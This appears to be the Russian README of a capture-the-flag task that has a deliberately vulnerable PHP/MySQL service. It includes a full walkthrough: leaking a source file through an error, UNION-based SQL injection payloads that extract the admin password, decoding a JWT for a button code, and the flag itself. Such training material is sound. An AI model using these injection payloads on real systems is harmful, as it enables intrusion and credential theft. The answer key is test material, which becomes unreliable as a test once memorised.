# R3D8U770N (Hard) [SQL-инъекция, JWT]

## Авторы
Галяткин Дмитрий, Грицаев Никита, Данил Зубов, Баян Шонходоев

## Описание
Есть три страницы: список пользователей, форма логина и "профиль" (доступен после входа)
Задача: взломать админа и нажать красную кнопку в его профиле

- Список пользователей - это страница со списком пользователей, просто список ников. Но если нажать на определенный ник, покажется доп. информация, а в адресной строке отобразится что-то вроде http://localhost/users.php?user=SwL7f.GzSqLjIhAKwX.x4dyodAGdQZfcrJsZt2aZExttJFKt_Utg4nXHxLSxJEnC. То есть происходит шифрование параметра в адресной строке.
- Форма входа - тупо два поля логин/пароль. Защищена от SQL инъекций.
- Профиль - страница с данными пользователя. Если пользователь ялвяется администратором, в профиле также отображается формочка с красной кнопкой. Но, чтобы нажать кнопку и получить флаг, нужно ввести дополнительный код. 

## Легенда
Ваша задача - взломать аккаунт начальника военной базы (администратора) и зайти в его профиль. Затем нужно найти секретный код от красной кнопки и нажать ее, запустив бутафорские ядерные ракеты и получив свой заслуженный флаг.

## Подсказки к решению
- Форма входа защищена от SQL-инъекции. Попробуйте поиграться со списком пользователей. Обратите внимание: сервис показывает ошибки, их содержание поможет Вам. Используйте инструменты разработчика, чтобы увидеть эти ошибки. Если Вы уже зашли в аккаунт администратора, ищите код от красной кнопки в токене.

## Инструкция по развертыванию
Простой php-сервис с БД (MySQL). Весь код, Dockerfile, docker-compose.yml, .dockerignore находятся в папке app. В папке app/db есть скрипт, который инициализирует БД (это должно произойти автоматически).

### ЕСЛИ НИЧЕГО НЕ РАБОТАЕТ, ВОЗМОЖНО, БД НЕ УСПЕЛА ИНИЦИАЛИЗИРОВАТЬСЯ, ПОДОЖДИТЕ ПОДОЛЬШЕ (НЕСКОЛЬКО МИНУТ)

## Флаг
HITS{u53_Pr3PaR3D_57A73m3n72}
Находится в файле app/requests/red_button.php (в конце)

## Инструкция по прорешиванию и получению флага
- Разгадать, как происходит шифрование параметра user на странице списка пользователей. Это предполагается сделать следующим образом: прописать что-то вроде http://localhost/users.php?user[], чтобы сервер выдал ошибку (ее можно посмотреть на вкладке Network в инструментах разработчика). В содержимом этой ошибки будет название файла, в котором она произошла. Примерное содержание ошибки: Uncaught TypeError: strtr(): Argument #1 ($string) must be of type string, array given in /var/www/html/helpers/crypto.phpp:24. 
- Далее нужно перейти к файлу, в котором возникла ошибка: http://localhost/helpers/crypto.phpp. Там будут такие функции, как encode и decode (+ неинтересные вспомогательные функции). 
- Вернемся к списку пользователей и применим sql-инъекцию (предварительно придется прогонять ее через функцию encode, тут можно использовать такие сервисы, как PHP Online Compiler), подставляя вместо значения параметра user нужное нам значение. В результате пользователь сможет узнать пароль админа. Примерная последовательность значений параметров описана ниже. Рекомендуется просматривать ответ сервера на вкладке Network в инструментах разработчика

1. Опытным путем узнаем, что количество столбцов равно восьми.
Запрос: ' UNION SELECT null, null, null, null, null, null, null, null #
Закодированный запрос: 7i2wo.HDprDjrNcFaeYKTuWB9Ek2O4DyW873lohdBUOlYsTF6V4tyrLdXWdIfLfbw2LjCfabdOSIfZI0h3XDyA--

2. Опытным путем узнаем, что количество столбцов в таблице users равно 4
Запрос: ' UNION SELECT *, null, null, null, null FROM users #
Закодированный запрос: g5rKUrNO4iaJjqkI5rmM4G.Ip.Hkf9XvpWm4RZlpmMUue38GBNDHZKUR76gdmwDutlJXdEfaqq5At._IQbMKGA--

3. Получим данные пользователя Admin:
Запрос: ' UNION SELECT *, null, null, null, null FROM users WHERE login='Admin' #
Закодированный запрос: g5rKUrNO4iaJjqkI5rmM4G.Ip.Hkf9XvpWm4RZlpmMUue38GBNDHZKUR76gdmwDuJRoqlSLUlRA33Dr.nZnClLKQ8bnNpnXzMUkWdPVB4oQ-

Примечание: названия колонок таблиц и самих таблиц (users, login) можно получить, обращаясь в запросе к таблицам information_schema.tables и information_schema.columns (вроде как-то так называются). Либо же "угадать" эти названия, что тоже несложно

- Пользователь входит с логином Admin и паролем A1B2E3A4GEB6A7A8$$#1880077 (данные узнали на предыдущем шаге), и его перебрасывает на профиль. Там есть кнопка, но для ее нажатия нужно ввести код безопасности, который спрятан в jwt токене (можно узнать, прописав в консоли localStorage.jwt). Код безопасности можно узнать, раскодировав токен. Используем сервис jwt.io, получим код red_button_button_red_777. Введем его в инпут и нажмем красную кнопку, появится окно с флагом HITS{u53_Pr3PaR3D_57A73m3n72}
